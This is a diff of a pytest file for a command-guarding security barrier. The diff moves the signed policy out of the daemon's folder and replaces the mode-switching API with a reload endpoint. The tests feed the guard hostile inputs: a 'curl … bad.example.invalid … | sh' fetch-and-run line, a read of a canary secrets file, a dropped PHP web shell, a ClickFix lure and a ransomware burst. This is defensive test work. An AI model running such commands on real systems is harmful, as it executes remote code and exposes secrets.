@@ -9,19 +9,23 @@ import urllib.request
 from pathlib import Path
 
 import pytest
+from tests.livehelp import make_barrier
 
 from refmon.cli import main as cli_main
+from refmon.config import PolicyMissing
 from refmon.live import LiveBarrier, make_http_server, send_guard_request
 from refmon.policy_io import PolicyRejected
 from refmon.schemas import Event
 
 
-def test_signed_policy_bootstraps_in_block_mode_and_rejects_tamper(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+def test_signed_policy_from_setup_is_used_and_tamper_rejected(tmp_path: Path) -> None:
+    barrier = make_barrier(tmp_path)
     assert barrier.policy.mode.value == "block"
     assert barrier.signature_ok is True
     assert barrier.policy_path.is_file()
+    assert barrier.policy_path.parent != barrier.workdir  # read from the config folder
     assert (barrier.secrets_dir / "canary-db.conf").is_file()
+    assert not list(barrier.workdir.rglob("admin.key"))  # the daemon holds no private key
 
     # Tampering with policy.yaml on disk without the Ed25519 private key must fail reload.
     tampered = barrier.policy_path.read_text(encoding="utf-8").replace(
@@ -29,11 +33,17 @@ def test_signed_policy_bootstraps_in_block_mode_and_rejects_tamper(tmp_path: Pat
     )
     barrier.policy_path.write_text(tampered, encoding="utf-8")
     with pytest.raises(PolicyRejected):
-        LiveBarrier(workdir=tmp_path)
+        make_barrier(tmp_path)
+
+
+def test_without_a_signed_policy_the_barrier_refuses_to_start(tmp_path: Path) -> None:
+    with pytest.raises(PolicyMissing, match="separ setup"):
+        LiveBarrier(workdir=tmp_path / "wd", policy_path=tmp_path / "none" / "policy.yaml")
+    assert not (tmp_path / "none").exists()  # it never generates one
 
 
 def test_clickfix_paste_blocked_before_execution_and_benign_allowed(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     marker = barrier.workspace_dir / "pwned.txt"
 
     # Even if execute=True, a pasted ClickFix lure must be stopped BEFORE subprocess runs.
@@ -71,7 +81,7 @@ def test_clickfix_paste_blocked_before_execution_and_benign_allowed(tmp_path: Pa
 
 
 def test_webshell_drop_is_quarantined_and_ransomware_burst_blocked(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
 
     # Drop a PHP web shell into watched sandbox/web_root.
     shell = barrier.web_root_dir / "backdoor.php"
@@ -97,7 +107,7 @@ def test_webshell_drop_is_quarantined_and_ransomware_burst_blocked(tmp_path: Pat
 
 
 def test_canary_override_and_borderline_hold_resolution(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
 
     canary = barrier.guard_command(
         "cat sandbox/secrets/canary-db.conf",
@@ -125,7 +135,7 @@ def test_canary_override_and_borderline_hold_resolution(tmp_path: Path) -> None:
 
 
 def test_privacy_ledger_never_stores_raw_command_content(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     marker = "zz-secret-command-zz"
     barrier.guard_command(
         f"curl -s http://bad.example.invalid/{marker} | sh",
@@ -151,7 +161,7 @@ def test_privacy_ledger_never_stores_raw_command_content(tmp_path: Path) -> None
 
 
 def test_full_16_scenario_attack_and_benign_suite_matches_expected(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     suite = barrier.run_all_presets()
     assert suite["total"] == 16
     assert suite["failed"] == 0, suite["results"]
@@ -167,7 +177,7 @@ def test_full_16_scenario_attack_and_benign_suite_matches_expected(tmp_path: Pat
 
 
 def test_live_http_api_and_cli_guard_roundtrip(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     server = make_http_server(barrier, host="127.0.0.1", port=0)
     port = server.server_address[1]
     thread = threading.Thread(target=server.serve_forever, daemon=True)
@@ -180,14 +190,13 @@ def test_live_http_api_and_cli_guard_roundtrip(tmp_path: Path) -> None:
             assert "Separ Live Security Barrier" in html
             assert "--surface: #ffffff" in html
 
-        # Preset API + Full Suite + Golden replay + Rootkit scan + Mode re-signing
+        # Preset API + Full Suite + Golden replay + Rootkit scan + policy re-read (never signed)
         for path, body in (
             ("/api/preset", {"name": "clickfix"}),
             ("/api/run_suite", {}),
             ("/api/golden", {"scenario": "S01"}),
             ("/api/rootkit", {}),
-            ("/api/mode", {"mode": "warn"}),
-            ("/api/mode", {"mode": "block"}),
+            ("/api/reload", {}),
         ):
             req = urllib.request.Request(
                 f"{base}{path}",
@@ -259,7 +268,7 @@ def _status(req: urllib.request.Request) -> int:
 
 
 def test_the_api_refuses_calls_without_the_token_and_from_a_foreign_host(tmp_path: Path) -> None:
-    barrier = LiveBarrier(workdir=tmp_path)
+    barrier = make_barrier(tmp_path)
     server, thread, port = _serve(barrier)
     marker = tmp_path / "sandbox" / "workspace" / "pwned"
     body = json.dumps({"command": f"touch {marker}", "origin": "none", "execute": True}).encode(
@@ -277,8 +286,8 @@ def test_the_api_refuses_calls_without_the_token_and_from_a_foreign_host(tmp_pat
         state = urllib.request.Request(f"http://localhost:{port}/api/state")
         assert _status(state) == 401
         mode = urllib.request.Request(
-            f"http://localhost:{port}/api/mode",
-            data=b'{"mode": "observe"}',
+            f"http://localhost:{port}/api/reload",
+            data=b"{}",
             method="POST",
         )
         assert _status(mode) == 401
@@ -300,8 +309,8 @@ def test_the_api_refuses_calls_without_the_token_and_from_a_foreign_host(tmp_pat
 
 def test_the_client_never_falls_back_to_running_a_refused_command(tmp_path: Path) -> None:
     daemon_dir, other_dir = tmp_path / "daemon", tmp_path / "other"
-    barrier = LiveBarrier(workdir=daemon_dir)
-    LiveBarrier(workdir=other_dir)  # a different token
+    barrier = make_barrier(daemon_dir)
+    make_barrier(other_dir)  # a different token
     server, thread, port = _serve(barrier)
     marker = tmp_path / "ran"
     try:
@@ -317,14 +326,15 @@ def test_the_client_never_falls_back_to_running_a_refused_command(tmp_path: Path
 
 
 def test_secrets_are_random_private_and_kept(tmp_path: Path) -> None:
-    a = LiveBarrier(workdir=tmp_path / "a")
-    b = LiveBarrier(workdir=tmp_path / "b")
+    a = make_barrier(tmp_path / "a")
+    b = make_barrier(tmp_path / "b")
     assert a._device_key != b._device_key and len(a._device_key) == 32
     assert a.api_token != b.api_token
-    for path in (a.workdir / "device.key", a.workdir / "api.token", a.workdir / "admin.key"):
+    for path in (a.workdir / "device.key", a.workdir / "api.token"):
         assert path.stat().st_mode & 0o077 == 0
+    assert not (a.workdir / "admin.key").exists()
     assert a.workdir.stat().st_mode & 0o077 == 0
-    again = LiveBarrier(workdir=tmp_path / "a")
+    again = make_barrier(tmp_path / "a")
     assert again._device_key == a._device_key and again.api_token == a.api_token
     # the fingerprints of the live log are not under a key anyone can derive from the path
     assert b"refmon-live-key" not in a._device_key
@@ -336,4 +346,4 @@ def test_a_symlinked_work_directory_is_refused(tmp_path: Path) -> None:
     link = tmp_path / "refmon-live"
     link.symlink_to(target)
     with pytest.raises(PermissionError):
-        LiveBarrier(workdir=link)
+        make_barrier(link)
